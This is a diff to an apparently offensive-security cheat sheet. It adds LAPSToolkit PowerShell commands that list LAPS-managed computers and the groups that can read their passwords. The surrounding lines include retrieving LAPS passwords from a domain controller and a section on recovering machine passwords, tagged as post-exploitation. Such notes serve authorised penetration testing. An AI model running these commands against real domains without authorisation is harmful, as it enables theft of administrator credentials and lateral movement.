@@ -8,6 +8,18 @@
 Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
 ```
 
+## get laps computer list
+```powershell
+Import-Module .\LAPSToolkit.ps1
+Get-LAPSComputers
+```
+
+## find the list of group who can manipulate SAM data
+```powershell
+Import-Module .\LAPSToolkit.ps1
+Find-LAPSDelegatedGroups
+```
+
 ## get all machine passwords
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
